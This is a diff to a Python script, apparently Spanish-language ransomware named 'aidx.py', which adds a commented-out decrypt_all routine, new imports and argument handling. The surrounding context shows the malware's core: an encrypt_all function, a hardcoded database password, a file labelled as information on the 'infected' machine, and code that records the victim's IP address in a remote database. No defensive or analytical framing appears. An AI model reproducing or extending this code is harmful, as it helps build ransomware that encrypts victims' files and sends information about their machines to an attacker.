@@ -4,14 +4,17 @@ import subprocess
 import win32com.shell.shell as shell
 from cryptography.fernet import Fernet
 from PIL import Image
+import win32api
 import requests
 import sys
 import shutil
+import mysql.connector
+import datetime
 
 
 from conec import Database
 from escan import obtener_informacion_sistema
-from utils import generar_key, cargar_key, encrypt
+from utils import generar_key, cargar_key, encrypt, decrypt 
 
 USERNAME = "root"
 PASSWORD = "Ponce1337"
@@ -136,6 +139,31 @@ def encrypt_all(application_path):
 
 
 
+'''
+
+def decrypt_all(application_path):
+    path_to_decrypt = os.path.join(application_path, "files")
+    key = cargar_key()
+
+    # Descifrar todos los archivos cifrados en la carpeta "files" del escritorio
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    path_to_decrypt = os.path.join(desktop_path, "files")
+    for root, directories, files in os.walk(path_to_decrypt):
+        for file in files:
+            file_path = os.path.join(root, file)
+            decrypt([file_path], key)
+
+    # Eliminar el archivo de clave "key.key"
+    os.remove(os.path.join(application_path, "key.key"))
+
+    # Eliminar la carpeta "files"
+    shutil.rmtree(path_to_decrypt, ignore_errors=True)
+
+    print("Carpeta 'files' eliminada con éxito.")
+   
+'''
+
+
 def main():
     # Reubicando esta línea para hacerla más efectiva
     db = Database()
@@ -187,18 +215,22 @@ def main():
                         archivo_infectado.write(clave + ': ' + str(valor) + '\n')
                 print("Archivo 'info_equipo_infectado.txt' creado con éxito en la carpeta 'files'.")
                 ip_address = informacion_sistema['Dirección IP']
+
                 ip_address = informacion_sistema['Dirección IP']
                 db.insert_data(ip_address)
-                 
-                     
+                
+         
                     
                     
                     
                     
-        #else:
-        #       print("Argumento inválido. Uso: aidx.py [ enc / des]")
+                    
+                    
+                    
+            else:
+                print("Argumento inválido. Uso: aidx.py [ enc / des]")
     else:
-        print("Argumento inválido. Uso: aidx.py enc ")
+        print("Argumento inválido. Uso: aidx.py [ enc / des ]")
 
 if __name__ == '__main__':
     main()
